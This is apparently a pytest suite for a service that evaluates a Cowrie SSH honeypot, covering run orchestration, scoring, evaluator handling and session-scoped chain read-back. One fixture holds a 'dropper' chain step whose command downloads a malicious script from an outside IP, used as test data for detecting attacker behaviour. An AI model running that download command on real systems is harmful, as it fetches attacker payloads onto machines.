import asyncio
import re
import uuid
from contextlib import asynccontextmanager
from datetime import datetime, timedelta, timezone

import pytest

from tests.conftest import null_capture
import pytest_asyncio
import sqlalchemy.exc
from sqlalchemy import select

from app.config import get_settings
from app.db.models import (
    EvaluationChainStep,
    EvaluationEvidence,
    EvaluationFinding,
    EvaluationProbeResult,
    EvaluationRun,
    EvidenceKind,
)
from app.db.session import get_session_factory
from app.services.evaluation import chain_runner, runs

# ModuleOutcome lives in `outcomes.py`, not in `static/nmap.py`. It is defined
# once there and imported by nmap, tcpdump and agent alike; importing it from
# a module that merely re-uses it is how two definitions of the same type get
# created.
from app.services.evaluation.evaluator import EvidenceItem
from app.services.evaluation.outcomes import ModuleOutcome
from app.services.evaluation.sanity import Observation
from app.services.evaluation.static.chains import ChainStepResult


@pytest_asyncio.fixture(loop_scope="session")
async def started():
    """Start runs through this and every row they create is removed.

    This suite runs against the real database. A run created before an
    assertion that then fails would otherwise be left behind -- with its
    modules, probes, chain steps, scores, findings and evidence -- for every
    later test and every later suite run to trip over. Teardown here happens
    whether the test passed, failed or raised.
    """
    created: list[uuid.UUID] = []

    async def _start(honeypot_id: str = "cowrie-01") -> uuid.UUID:
        run_id = await runs.start_run(honeypot_id)
        created.append(run_id)
        return run_id

    _start.track = created.append  # rows built by hand still get cleaned up
    yield _start
    for run_id in created:
        await runs.delete_run(run_id)


@pytest.mark.asyncio
async def test_a_run_completes_with_the_evaluator_unavailable(monkeypatch, started) -> None:
    # The load-bearing checkpoint: a complete evaluation with no BYOK key.
    # run_status and evaluator_status are orthogonal, so a consumer can ask
    # "did the evaluation execute?" separately from "did the LLM run?".
    _stub_modules(monkeypatch)
    monkeypatch.setattr(runs, "_evaluator_client", lambda: None)

    run_id = await started()
    run = await runs.load_run(run_id)
    assert run.status == "completed"
    assert run.evaluator_status == "unavailable"
    assert any(s.deterministic_score is not None for s in run.category_scores)
    assert all(s.evaluator_rating is None for s in run.category_scores)


@pytest.mark.asyncio
async def test_a_failing_stage_is_recorded_and_the_run_still_finishes(
    monkeypatch, started
) -> None:
    # Named for what it checks. The capture is a separate guarantee with its
    # own tests below -- this one installs `null_capture`, which never
    # produces an outcome, so it could not assert anything about one.
    _stub_modules(monkeypatch)

    async def _boom(*args, **kwargs):
        raise RuntimeError("agent exploded")

    monkeypatch.setattr(runs, "_run_agent", _boom)

    run_id = await started()
    run = await runs.load_run(run_id)
    assert run.status in {"completed", "failed"}
    assert run.finished_at is not None
    agent_module = next(m for m in run.modules if m.module == "agent")
    assert agent_module.module_status == "error"


@pytest.mark.asyncio
async def test_every_module_stage_is_recorded(monkeypatch, started) -> None:
    """A silently dropped stage must fail a test, not just shrink a report.

    nmap, the agent, the chains and tcpdump each write one module row. Without
    this, three of the four could be deleted from the orchestrator and the
    suite would stay green.
    """
    _stub_modules(monkeypatch)
    monkeypatch.setattr(runs, "_capture", _draining_capture(_tcpdump_outcome()))
    monkeypatch.setattr(runs, "_run_chains", _chain_results)

    run_id = await started()
    run = await runs.load_run(run_id)
    assert {m.module for m in run.modules} == {"nmap", "agent", "chains", "tcpdump"}
    assert all(m.module_status == "completed" for m in run.modules)


@pytest.mark.asyncio
async def test_compare_flags_a_honeypot_configuration_change(monkeypatch, started) -> None:
    _stub_modules(monkeypatch)
    monkeypatch.setattr(runs, "_evaluator_client", lambda: None)

    first = await started()
    monkeypatch.setattr(runs, "_honeypot_fingerprint", _fixed("sha256:CHANGED"))
    second = await started()

    comparison = await runs.compare_runs(first, second)
    assert comparison.classification == "configuration_changed"
    assert "honeypot_fingerprint" in comparison.differences


@pytest.mark.asyncio
async def test_compare_deltas_are_real_numbers_and_none_where_nothing_was_established(
    monkeypatch, started
) -> None:
    """The point of the whole task is comparing two runs, so compare two runs.

    `deltas` had no test at all. Both halves matter: a real delta must be
    computed, and a delta against "not established" must stay None rather than
    resurrecting the 0.0 that None exists to prevent.
    """
    _stub_modules(monkeypatch)
    monkeypatch.setattr(runs, "_evaluator_client", lambda: None)

    base = await started()

    monkeypatch.setattr(runs, "_run_agent", _agent_returning("not_observed", value=None))
    dropped = await started()

    monkeypatch.setattr(runs, "_run_agent", _agent_returning("unknown", value=None))
    undetermined = await started()

    measured = await runs.compare_runs(base, dropped)
    # 1.0 observed -> 0.0 observed. A honeypot that failed every checkable
    # thing was still measured, so this is a real -1.0, not a None.
    assert measured.deltas["basic_commands"] == -1.0
    assert measured.classification == "same_configuration"

    against_unknown = await runs.compare_runs(base, undetermined)
    # Every fact `unknown` -> the characteristic scored None -> no delta.
    assert against_unknown.deltas["basic_commands"] is None


@pytest.mark.asyncio
async def test_a_failing_reset_aborts_the_run_and_leaves_no_row(monkeypatch) -> None:
    """Reset produces no evidence -- it establishes the precondition.

    A run whose reset failed may be observing the previous run's residue, so
    every comparison drawn from it is unsound. It must report failed-to-start,
    never a score with a caveat. There is no run row to caveat anyway: both
    fingerprint columns are NOT NULL and both fingerprint functions raise, so
    a row cannot exist before reset has succeeded.
    """
    _stub_modules(monkeypatch)

    async def _refuse(*args, **kwargs):
        raise runs.ResetError("reset of /cowrie/... timed out")

    monkeypatch.setattr(runs, "_reset_target", _refuse)

    before = await _run_count()
    with pytest.raises(runs.ResetError):
        await runs.start_run("cowrie-01")
    assert await _run_count() == before


@pytest.mark.asyncio
async def test_a_reset_boundary_error_also_aborts_the_run(monkeypatch) -> None:
    # ResetBoundaryError is a ValueError, NOT a ResetError -- an
    # `except ResetError` handler does not catch it.
    _stub_modules(monkeypatch)

    async def _refuse(*args, **kwargs):
        raise runs.ResetBoundaryError("reset path covers preserved path")

    monkeypatch.setattr(runs, "_reset_target", _refuse)

    before = await _run_count()
    with pytest.raises(runs.ResetBoundaryError):
        await runs.start_run("cowrie-01")
    assert await _run_count() == before


@pytest.mark.asyncio
async def test_delete_run_removes_every_child_in_foreign_key_order(
    monkeypatch, started
) -> None:
    """No FK in the evaluation schema declares ondelete, so order is ours.

    Evidence points at findings AND at chain steps AND at probe results, so it
    has to go first; the run row can only go last.
    """
    _stub_modules(monkeypatch)
    monkeypatch.setattr(runs, "_run_chains", _chain_results)
    monkeypatch.setattr(runs, "_evaluator_client", lambda: None)

    run_id = await started()

    # A finding with evidence pointing at both child kinds, so deleting in the
    # wrong order raises rather than silently passing on an empty table.
    async with get_session_factory()() as db:
        probe_row = (
            await db.execute(
                select(EvaluationProbeResult).where(EvaluationProbeResult.run_id == run_id)
            )
        ).scalars().first()
        chain_row = (
            await db.execute(
                select(EvaluationChainStep).where(EvaluationChainStep.run_id == run_id)
            )
        ).scalars().first()
        assert probe_row is not None and chain_row is not None

        finding = EvaluationFinding(
            run_id=run_id,
            characteristic="sanity",
            severity="high",
            finding="manufactured for the delete-order guard",
            source="deterministic",
            finding_key="probe:fixture-1:fixture.fact",
        )
        runs._stage_finding(
            db,
            runs.PendingFinding(
                finding=finding,
                evidence=[
                    EvaluationEvidence(
                        finding_id=finding.id,
                        kind=EvidenceKind.PROBE,
                        probe_result_id=probe_row.id,
                    ),
                    EvaluationEvidence(
                        finding_id=finding.id,
                        kind=EvidenceKind.CHAIN_STEP,
                        chain_step_id=chain_row.id,
                    ),
                ],
            ),
        )
        await runs._flush_findings(db)
        await db.commit()

    await runs.delete_run(run_id)

    async with get_session_factory()() as db:
        assert await db.get(EvaluationRun, run_id) is None
        for model, column in (
            (EvaluationProbeResult, EvaluationProbeResult.run_id),
            (EvaluationChainStep, EvaluationChainStep.run_id),
            (EvaluationFinding, EvaluationFinding.run_id),
        ):
            remaining = (await db.execute(select(model).where(column == run_id))).scalars().all()
            assert remaining == []


@pytest.mark.asyncio
async def test_a_finding_without_evidence_is_rejected_at_commit(monkeypatch, started) -> None:
    """The deferred constraint trigger fires at COMMIT, not at INSERT.

    Proven through the orchestrator's own persistence path, so the guarantee
    is that THIS code cannot write an ungrounded finding -- not merely that
    the database has a trigger somewhere.
    """
    _stub_modules(monkeypatch)
    monkeypatch.setattr(runs, "_evaluator_client", lambda: None)

    run_id = await started()
    with pytest.raises(sqlalchemy.exc.DatabaseError) as excinfo:
        async with get_session_factory()() as db:
            runs._stage_finding(
                db,
                runs.PendingFinding(
                    finding=EvaluationFinding(
                        run_id=run_id,
                        characteristic="sanity",
                        severity="high",
                        finding="ungrounded",
                        source="deterministic",
                        finding_key="probe:fixture-2:fixture.fact",
                    ),
                    evidence=[],
                ),
            )
            await runs._flush_findings(db)
            # The INSERT itself succeeds; the trigger is DEFERRED.
            await db.commit()
    assert "no evidence" in str(excinfo.value)


@pytest.mark.asyncio
async def test_no_chains_means_no_attack_possibilities_score(monkeypatch, started) -> None:
    # scoring.score_characteristics adds the key only `if chain_results:` --
    # absent, not None. Absence must never be turned into a 0.0 either.
    _stub_modules(monkeypatch)
    monkeypatch.setattr(runs, "_evaluator_client", lambda: None)

    run_id = await started()
    run = await runs.load_run(run_id)
    assert run.status == "completed"
    characteristics = {s.characteristic for s in run.category_scores}
    assert "attack_possibilities" not in characteristics
    assert characteristics  # the other characteristics were still scored
    assert any(s.deterministic_score is not None for s in run.category_scores)


@pytest.mark.asyncio
async def test_a_scoring_failure_never_reports_an_observed_fact_as_a_failed_run(
    monkeypatch, started
) -> None:
    """Our failure is not evidence against the honeypot.

    `_score` is a pure function, so a failure in it is entirely ours. The
    probe row it would have scored is already collected and still persists,
    and the run established a fact -- so it is COMPLETED. Reporting FAILED
    here would state that the honeypot established nothing, on the evidence of
    a row saying it did. Nothing is invented to fill the gap either: the
    category score stays absent rather than becoming 0.0.
    """
    _stub_modules(monkeypatch)
    monkeypatch.setattr(runs, "_evaluator_client", lambda: None)

    def _boom(*args, **kwargs):
        raise RuntimeError("scoring exploded")

    monkeypatch.setattr(runs, "_score", _boom)

    run_id = await started()
    run = await runs.load_run(run_id)
    assert run.finished_at is not None
    assert run.status == "completed"
    assert run.category_scores == []
    assert [(p.probe_id, p.fact_status) for p in run.probe_results] == [("uname", "observed")]


@pytest.mark.asyncio
async def test_an_orchestration_failure_still_persists_the_scores_it_established(
    monkeypatch, started
) -> None:
    """An exception OUTSIDE every per-stage `try` must not erase a measurement.

    `_emit(4)` sits in the orchestration frame, between the capture and
    scoring. When the scores were assigned on the happy path only, an
    exception here left `collected.scores` empty, `_persist` wrote FAILED, and
    it did so in the same transaction as probe rows holding `observed` facts.
    """
    _stub_modules(monkeypatch)
    monkeypatch.setattr(runs, "_evaluator_client", lambda: None)
    monkeypatch.setattr(runs, "_emit", _emit_failing_at(4))

    run_id = await started()
    run = await runs.load_run(run_id)
    assert run.status == "completed"
    scored = next(s for s in run.category_scores if s.characteristic == "basic_commands")
    assert scored.deterministic_score == 1.0
    assert any(p.fact_status == "observed" for p in run.probe_results)


@pytest.mark.asyncio
async def test_a_run_that_established_nothing_at_all_is_failed(monkeypatch, started) -> None:
    """The other side of the boundary, so the fallback cannot swallow it.

    Every fact `unknown` means nothing was established, which is exactly what
    FAILED means here -- and it must still be FAILED when scoring itself blew
    up, or the fallback would have turned every crash into a completed run.
    """
    _stub_modules(monkeypatch)
    monkeypatch.setattr(runs, "_evaluator_client", lambda: None)
    monkeypatch.setattr(runs, "_run_agent", _agent_returning("unknown", value=None))

    def _boom(*args, **kwargs):
        raise RuntimeError("scoring exploded")

    monkeypatch.setattr(runs, "_score", _boom)

    run_id = await started()
    run = await runs.load_run(run_id)
    assert run.status == "failed"


@pytest.mark.asyncio
async def test_the_drained_capture_is_recorded_even_when_a_stage_raises(
    monkeypatch, started
) -> None:
    """`Capture.stop` sets `.outcome` in its own finally; so recording it must
    happen in ours.

    The outcome is a drained measurement that exists whatever went wrong above
    it. Recording it after the `async with` meant a propagating exception
    skipped the recording entirely: no tcpdump module row, no observation, and
    nothing in the persisted run to say which stage aborted.
    """
    _stub_modules(monkeypatch)
    monkeypatch.setattr(runs, "_evaluator_client", lambda: None)
    monkeypatch.setattr(runs, "_capture", _draining_capture(_tcpdump_outcome()))
    monkeypatch.setattr(runs, "_emit", _emit_failing_at(3))

    run_id = await started()
    run = await runs.load_run(run_id)

    tcpdump_module = next(m for m in run.modules if m.module == "tcpdump")
    assert tcpdump_module.module_status == "completed"
    assert ("tcpdump", "network.activity", "observed") in [
        (p.module, p.probe_id, p.fact_status) for p in run.probe_results
    ]
    # And, having been recorded before scoring, it was actually scored.
    context = next(s for s in run.category_scores if s.characteristic == "context")
    assert context.deterministic_score == 1.0


@pytest.mark.asyncio
async def test_a_failed_evaluator_leaves_the_rating_null_not_zero(monkeypatch, started) -> None:
    """UNAVAILABLE and EVALUATOR_FAILED both return `verdict is None`.

    A missing realism judgement is "not established". Rendering it as 0.0
    would present our own provider error as a verdict against the honeypot.
    """
    _stub_modules(monkeypatch)

    class _BrokenClient:
        model_name = "test-evaluator"

        async def complete_json(self, prompt, schema):
            raise RuntimeError("429 rate limited")

    monkeypatch.setattr(runs, "_evaluator_client", lambda: _BrokenClient())

    run_id = await started()
    run = await runs.load_run(run_id)
    assert run.evaluator_status == "evaluator_failed"
    assert run.evaluator_model == "test-evaluator"
    assert all(s.evaluator_rating is None for s in run.category_scores)
    # The deterministic measurement survives a broken evaluator intact.
    assert any(s.deterministic_score is not None for s in run.category_scores)
    assert run.status == "completed"


@pytest.mark.asyncio
async def test_a_misconfigured_byok_provider_is_not_reported_as_unavailable(
    monkeypatch, started
) -> None:
    """A configuration error must not masquerade as "no evaluator configured".

    `unavailable` means we never tried. With a key, a model and a provider
    `ByokClient` does not implement, we tried and our own configuration broke
    it -- which is `evaluator_failed`. Reported as `unavailable`, a mistyped
    BYOK_PROVIDER is indistinguishable from an empty .env.
    """
    real_evaluator_client = runs._evaluator_client
    _stub_modules(monkeypatch)
    monkeypatch.setattr(runs, "_evaluator_client", real_evaluator_client)

    misconfigured = get_settings().model_copy(
        update={
            "byok_provider": "gemini",
            "byok_api_key": "not-a-real-key",
            "byok_model": "gemini-2.0-flash",
        }
    )
    monkeypatch.setattr(runs, "get_settings", lambda: misconfigured)

    run_id = await started()
    run = await runs.load_run(run_id)
    assert run.evaluator_status == "evaluator_failed"
    assert run.evaluator_model is None
    # The deterministic half is untouched, exactly as with a provider error.
    assert run.status == "completed"
    assert any(s.deterministic_score is not None for s in run.category_scores)
    assert all(s.evaluator_rating is None for s in run.category_scores)


@pytest.mark.asyncio
async def test_compare_names_each_differing_fingerprint_independently(
    monkeypatch, started
) -> None:
    """The two fingerprints carry opposite implications for attribution.

    A changed honeypot fingerprint is the POINT of the comparison. A changed
    evaluation-config fingerprint is what makes two runs incomparable. Both
    classify as `configuration_changed`, so `differences` has to say which.
    """
    _stub_modules(monkeypatch)
    monkeypatch.setattr(runs, "_evaluator_client", lambda: None)

    base = await started()

    monkeypatch.setattr(runs, "_honeypot_fingerprint", _fixed("sha256:HP-CHANGED"))
    honeypot_changed = await started()

    monkeypatch.setattr(runs, "_honeypot_fingerprint", _fixed("sha256:BASE"))
    monkeypatch.setattr(
        runs, "_evaluation_config_fingerprint", lambda budget, apparatus: "sha256:CFG-CHANGED"
    )
    config_changed = await started()

    honeypot_delta = await runs.compare_runs(base, honeypot_changed)
    assert honeypot_delta.classification == "configuration_changed"
    assert honeypot_delta.differences == ["honeypot_fingerprint"]

    config_delta = await runs.compare_runs(base, config_changed)
    assert config_delta.classification == "configuration_changed"
    assert config_delta.differences == ["evaluation_config_fingerprint"]

    same = await runs.compare_runs(base, base)
    assert same.classification == "same_configuration"
    assert same.differences == []


@pytest.mark.asyncio
async def test_an_evaluator_finding_persists_with_its_cited_evidence(
    monkeypatch, started
) -> None:
    """The evaluator references evidence; it never creates it.

    Exercises the whole grounded path in one transaction: probe rows are
    flushed before the evidence that carries an immediate FK to them, and the
    finding plus its evidence reach COMMIT together for the deferred trigger.
    """
    _stub_modules(monkeypatch)

    class _CitingClient:
        model_name = "test-evaluator"

        async def complete_json(self, prompt, schema):
            # The package ids are generated at run time, so the fake reads
            # back the id it was actually offered rather than inventing one --
            # an invented id is rejected by the citation check by design.
            offered = re.findall(r"- \[(probe:[0-9a-f-]{36})\]", prompt)
            assert offered, prompt
            return schema(
                rating=0.25,
                critique="the shell answers too uniformly to be a real host",
                recommendation="vary command latency",
                cited_evidence_ids=[offered[0]],
            )

    monkeypatch.setattr(runs, "_evaluator_client", lambda: _CitingClient())

    run_id = await started()
    run = await runs.load_run(run_id)
    assert run.status == "completed"
    assert run.evaluator_status == "completed"
    assert run.evaluator_model == "test-evaluator"

    finding = next(f for f in run.findings if f.source == "evaluator")
    # Severity renders the evaluator's OWN rating; it is not a second
    # independent judgement.
    assert finding.severity == "high"
    assert finding.evidence
    assert all(e.kind == "probe" and e.probe_result_id for e in finding.evidence)

    rated = next(s for s in run.category_scores if s.characteristic == "basic_commands")
    assert rated.evaluator_rating == 0.25
    # Still two separate quantities, never merged.
    assert rated.deterministic_score == 1.0


@pytest.mark.asyncio
async def test_a_verdict_citing_only_the_truncation_notice_persists_no_rating(
    monkeypatch, started
) -> None:
    """A rating must not outlive the finding it was attached to.

    The truncation notice is a legitimate member of the offered set, so
    `evaluate_characteristic` accepts a verdict citing only it -- but it does
    not resolve to a persistable row, so the finding is dropped. If the rating
    survived that, the UI would show a realism rating with no critique, no
    recommendation and no evidence, indistinguishable from a grounded one:
    the ungrounded verdict `evaluator.py` exists to prevent.
    """
    _stub_modules(monkeypatch)
    monkeypatch.setattr(runs, "_run_agent", _agent_with_enough_probes_to_truncate())

    class _NoticeCitingClient:
        model_name = "test-evaluator"

        async def complete_json(self, prompt, schema):
            assert runs.TRUNCATION_NOTICE_ID in prompt
            return schema(
                rating=0.9,
                critique="looks plausible enough",
                recommendation=None,
                cited_evidence_ids=[runs.TRUNCATION_NOTICE_ID],
            )

    monkeypatch.setattr(runs, "_evaluator_client", lambda: _NoticeCitingClient())

    run_id = await started()
    run = await runs.load_run(run_id)
    assert run.status == "completed"
    rated = next(s for s in run.category_scores if s.characteristic == "basic_commands")
    assert rated.evaluator_rating is None
    assert rated.deterministic_score == 1.0
    assert [f for f in run.findings if f.source == "evaluator"] == []


@pytest.mark.asyncio
async def test_a_verdict_citing_the_notice_and_one_real_id_keeps_both(
    monkeypatch, started
) -> None:
    """The mixed case stays grounded: one real citation is enough.

    The guard above drops a rating only when NOTHING it cited resolved. A
    verdict that also cited a real probe row is grounded in that row, and both
    the finding and the rating must survive.
    """
    _stub_modules(monkeypatch)
    monkeypatch.setattr(runs, "_run_agent", _agent_with_enough_probes_to_truncate())

    class _MixedClient:
        model_name = "test-evaluator"

        async def complete_json(self, prompt, schema):
            offered = re.findall(r"- \[(probe:[0-9a-f-]{36})\]", prompt)
            assert offered, prompt
            return schema(
                rating=0.4,
                critique="the filesystem is thin in places",
                recommendation="add plausible user data",
                cited_evidence_ids=[runs.TRUNCATION_NOTICE_ID, offered[0]],
            )

    monkeypatch.setattr(runs, "_evaluator_client", lambda: _MixedClient())

    run_id = await started()
    run = await runs.load_run(run_id)
    rated = next(s for s in run.category_scores if s.characteristic == "basic_commands")
    assert rated.evaluator_rating == 0.4
    finding = next(f for f in run.findings if f.source == "evaluator")
    # One evidence row: the notice contributed nothing, as it should not.
    assert len(finding.evidence) == 1
    assert finding.evidence[0].kind == "probe"


@pytest.mark.asyncio
async def test_two_probes_disagreeing_about_one_fact_become_a_grounded_finding(
    monkeypatch, started
) -> None:
    _stub_modules(monkeypatch)
    monkeypatch.setattr(runs, "_evaluator_client", lambda: None)

    async def _disagreeing_agent(*args, **kwargs):
        return ModuleOutcome(
            module="agent",
            module_status="completed",
            observations=[
                Observation(
                    probe_id="hostname_cmd",
                    establishes="host.name",
                    value="med-ws-04",
                    fact_status="observed",
                ),
                Observation(
                    probe_id="hostname_file",
                    establishes="host.name",
                    value="svr04",
                    fact_status="observed",
                ),
            ],
        )

    monkeypatch.setattr(runs, "_run_agent", _disagreeing_agent)

    run_id = await started()
    run = await runs.load_run(run_id)
    finding = next(f for f in run.findings if f.source == "deterministic")
    assert finding.characteristic == "sanity"
    assert "host.name" in finding.finding
    # Grounded in both probes that disagreed, or the deferred trigger
    # would have rejected it at COMMIT.
    assert len(finding.evidence) == 2


# --- chain read-back ----------------------------------------------------


@pytest.mark.asyncio
async def test_the_chain_read_back_query_is_scoped_to_our_own_ssh_session(
    monkeypatch,
) -> None:
    """`honeypot.id` + time is not enough on a LIVE sensor.

    A concurrent attacker session shares both. Cowrie's `session.id` for the
    shell we opened is the only filter that separates their `cd /tmp` from
    ours.
    """
    captured: dict = {}

    class _FakeEs:
        async def search(self, **kwargs):
            captured.update(kwargs)
            return {"hits": {"hits": []}}

    monkeypatch.setattr(chain_runner, "get_es", lambda: _FakeEs())

    now = datetime.now(timezone.utc)
    await chain_runner.search_commands("cowrie-01", now, now, "sess-ours")

    filters = captured["query"]["bool"]["filter"]
    assert {"term": {"session.id": "sess-ours"}} in filters
    assert {"term": {"honeypot.id": "cowrie-01"}} in filters
    assert {"term": {"labels.seeded": False}} in filters
    # Kept as defence in depth: a session id identifies one shell, not one
    # run, so time is still what separates two of our OWN runs.
    assert any("range" in clause for clause in filters)


@pytest.mark.asyncio
async def test_the_chain_read_back_ignores_a_command_from_another_session(
    monkeypatch,
) -> None:
    """A foreign event must never become this run's chain evidence.

    `cd /tmp` is a declared step of the `dropper` chain and an utterly ordinary
    thing for a real intruder to type. If one landed inside our window, an
    unscoped read-back would complete our chain and store somebody else's
    `cowrie_event_id` as our evidence.
    """
    ours = _command_hit("ours", "cd /tmp", session_id="sess-ours")
    theirs = _command_hit("theirs", "cd /tmp", session_id="sess-theirs")

    async def _both(*args, **kwargs):
        return [theirs, ours]

    monkeypatch.setattr(chain_runner, "search_commands", _both)

    now = datetime.now(timezone.utc)
    found = await chain_runner.read_back_commands("cowrie-01", now, now, {"cd /tmp"}, "sess-ours")
    assert found["cd /tmp"].event_id == "ours"

    # And with only the foreign event present, the step is simply not found:
    # unverified, which scoring excludes -- never credited to us.
    async def _only_theirs(*args, **kwargs):
        return [theirs]

    monkeypatch.setattr(chain_runner, "search_commands", _only_theirs)
    monkeypatch.setattr(chain_runner, "CHAIN_INGEST_TIMEOUT_SECONDS", 0.0)
    assert await chain_runner.read_back_commands("cowrie-01", now, now, {"cd /tmp"}, "sess-ours") == {}


@pytest.mark.asyncio
async def test_an_undiscoverable_session_leaves_the_chains_unverified(monkeypatch) -> None:
    """If we cannot prove which events are ours, we claim none of them."""
    monkeypatch.setattr(chain_runner.agent_module, "_open_session", _stub_session)
    monkeypatch.setattr(chain_runner.agent_module, "_execute", _stub_execute)

    async def _not_found(*args, **kwargs):
        return None

    monkeypatch.setattr(chain_runner, "discover_cowrie_session_id", _not_found)

    async def _must_not_run(*args, **kwargs):  # pragma: no cover - asserts absence
        raise AssertionError("the read-back must not run unscoped")

    monkeypatch.setattr(chain_runner, "search_commands", _must_not_run)

    chain_run = await runs._run_chains(
        runs.EvaluationTarget(host="h", port=2222, username="root", password="x", kind="cowrie"),
        "cowrie-01",
    )
    assert chain_run.results == []
    assert chain_run.module_status == "error"
    assert "session id" in chain_run.detail


# --- run lifecycle ------------------------------------------------------


@pytest.mark.asyncio
async def test_is_running_reflects_the_run_row(monkeypatch, started) -> None:
    _stub_modules(monkeypatch)
    monkeypatch.setattr(runs, "_evaluator_client", lambda: None)

    assert await runs.is_running("cowrie-not-a-honeypot") is False

    run_id = await started("cowrie-is-running-test")
    # A finished run does not hold the honeypot.
    assert await runs.is_running("cowrie-is-running-test") is False

    async with get_session_factory()() as db:
        run = await db.get(EvaluationRun, run_id)
        run.status = "running"
        await db.commit()
    try:
        assert await runs.is_running("cowrie-is-running-test") is True
    finally:
        # Put it back even if that assertion fails: a row left RUNNING is
        # exactly the lockout the reconciler exists for, and leaving one in a
        # shared database would be a booby trap for the next run of the suite.
        async with get_session_factory()() as db:
            run = await db.get(EvaluationRun, run_id)
            run.status = "failed"
            await db.commit()


@pytest.mark.asyncio
async def test_a_stale_running_run_is_reconciled_instead_of_locking_the_honeypot_out(
    started,
) -> None:
    """A crashed run must not lock its honeypot out forever.

    When `_persist` AND `_force_terminal` both fail -- or the process is simply
    killed -- the row stays `running` with `finished_at` NULL and nothing in
    the system would ever clear it. `is_running` then answers True forever and
    Task 15's 409 refuses every future run for that honeypot.
    """
    honeypot = "cowrie-stale-test"
    run_id = uuid.uuid4()
    started.track(run_id)
    async with get_session_factory()() as db:
        db.add(
            EvaluationRun(
                id=run_id,
                honeypot_id=honeypot,
                status="running",
                started_at=datetime.now(timezone.utc) - timedelta(days=3),
                agent_model="deterministic-probes@1",
                evaluator_status="unavailable",
                honeypot_fingerprint="sha256:BASE",
                evaluation_config_fingerprint="sha256:CFG",
            )
        )
        await db.commit()

    assert await runs.is_running(honeypot) is True

    reconciled = await runs.reconcile_stale_runs(honeypot)
    assert run_id in reconciled
    assert await runs.is_running(honeypot) is False

    run = await runs.load_run(run_id)
    assert run.status == "failed"
    assert run.finished_at is not None
    # FAILED with no explanation would be a worse artefact than the lockout.
    orchestrator = next(m for m in run.modules if m.module == "orchestrator")
    assert "reconciled as failed" in orchestrator.detail


@pytest.mark.asyncio
async def test_a_run_that_could_still_be_in_progress_is_never_reconciled(started) -> None:
    """The sweep runs on the way into `start_run`, so this is load-bearing.

    Only rows older than every bound a run is subject to are touched. A row
    younger than that may be a live run, and terminating its row underneath it
    would lose the run it is about to persist.
    """
    honeypot = "cowrie-fresh-test"
    run_id = uuid.uuid4()
    started.track(run_id)
    async with get_session_factory()() as db:
        db.add(
            EvaluationRun(
                id=run_id,
                honeypot_id=honeypot,
                status="running",
                started_at=datetime.now(timezone.utc),
                agent_model="deterministic-probes@1",
                evaluator_status="unavailable",
                honeypot_fingerprint="sha256:BASE",
                evaluation_config_fingerprint="sha256:CFG",
            )
        )
        await db.commit()

    assert await runs.reconcile_stale_runs(honeypot) == []
    assert await runs.is_running(honeypot) is True


@pytest.mark.asyncio
async def test_force_terminal_is_the_last_resort_against_a_running_row(
    monkeypatch, started
) -> None:
    """Reachable only when `_persist` failed; it must still finish the row."""
    _stub_modules(monkeypatch)
    monkeypatch.setattr(runs, "_evaluator_client", lambda: None)

    run_id = await started()
    async with get_session_factory()() as db:
        run = await db.get(EvaluationRun, run_id)
        run.status = "running"
        run.finished_at = None
        await db.commit()

    await runs._force_terminal(run_id)

    run = await runs.load_run(run_id)
    assert run.status == "failed"
    assert run.finished_at is not None

    # An id that is not there is not an error: everything is already lost.
    await runs._force_terminal(uuid.uuid4())


# --- evidence packaging -------------------------------------------------


def test_bound_package_truncates_visibly_and_never_silently() -> None:
    """Past MAX_PACKAGE_ITEMS, dropping is unavoidable -- hiding it is not."""
    items = [EvidenceItem(id=f"probe:{index}", summary="x" * 40_000) for index in range(45)]
    bounded = runs._bound_package(items)

    assert len(bounded) == runs.MAX_PACKAGE_ITEMS + 1
    notice = bounded[-1]
    assert notice.id == runs.TRUNCATION_NOTICE_ID
    assert "5 further evidence items" in notice.summary
    # The whole package is bounded, not just each item: every survivor is cut
    # to its share of MAX_PACKAGE_CHARS (plus `truncate_text`'s own visible,
    # counted omission marker), where N x MAX_ITEM_CHARS was unbounded.
    share = runs.MAX_PACKAGE_CHARS // runs.MAX_PACKAGE_ITEMS
    assert all(len(item.summary) <= share + 200 for item in bounded[:-1])
    assert sum(len(item.summary) for item in bounded) < 45 * 40_000 // 10


def test_bound_package_adds_no_notice_when_nothing_was_dropped() -> None:
    items = [EvidenceItem(id=f"probe:{index}", summary="short") for index in range(3)]
    bounded = runs._bound_package(items)
    assert [item.id for item in bounded] == ["probe:0", "probe:1", "probe:2"]
    assert all(item.summary == "short" for item in bounded)


# --- helpers ------------------------------------------------------------


async def _run_count() -> int:
    async with get_session_factory()() as db:
        return len((await db.execute(select(EvaluationRun.id))).scalars().all())


def _fixed(value: str):
    async def _inner(*args, **kwargs) -> str:
        return value

    return _inner


async def _chain_results(*args, **kwargs):
    return [
        ChainStepResult(
            chain_id="dropper",
            step_index=0,
            command="wget http://198.51.100.7/malicious_script.sh",
            cowrie_event_id="event-1",
            matched_rule_id="R-T1105",
            expected_technique_id="T1105",
            fact_status="observed",
        )
    ]


def _agent_returning(fact_status: str, value: str | None = "Linux"):
    async def _agent(*args, **kwargs):
        return ModuleOutcome(
            module="agent",
            module_status="completed",
            observations=[
                Observation(
                    probe_id="uname",
                    establishes="os.identity",
                    value=value,
                    fact_status=fact_status,
                )
            ],
        )

    return _agent


def _agent_with_enough_probes_to_truncate():
    """More observations than MAX_PACKAGE_ITEMS, so a truncation notice exists.

    Every value is identical on purpose: differing values for one declared
    fact are a contradiction, and this fixture is about packaging, not sanity.
    """

    async def _agent(*args, **kwargs):
        return ModuleOutcome(
            module="agent",
            module_status="completed",
            observations=[
                Observation(
                    probe_id="uname",
                    establishes="os.identity",
                    value="Linux",
                    fact_status="observed",
                )
                for _ in range(runs.MAX_PACKAGE_ITEMS + 5)
            ],
        )

    return _agent


def _tcpdump_outcome() -> ModuleOutcome:
    return ModuleOutcome(
        module="tcpdump",
        module_status="completed",
        observations=[
            Observation(
                probe_id="network.activity",
                establishes="network.activity",
                value="128",
                fact_status="observed",
            )
        ],
    )


def _draining_capture(outcome: ModuleOutcome):
    """A capture that sets `.outcome` in its own finally, as the real one does.

    `null_capture` never produces an outcome, so no test using it can
    say anything about the drained-capture path.
    """

    class _Cap:
        outcome = None

    @asynccontextmanager
    async def _capture(interface: str, timeout_seconds: int, capture_container: str):
        cap = _Cap()
        try:
            yield cap
        finally:
            cap.outcome = outcome

    return _capture


def _emit_failing_at(stage_index: int):
    """An orchestration-frame failure: outside every per-stage try/except."""
    real_emit = runs._emit

    async def _emit(run_id, index, **metrics):
        if index == stage_index:
            raise RuntimeError(f"progress publish exploded at stage {index}")
        return await real_emit(run_id, index, **metrics)

    return _emit


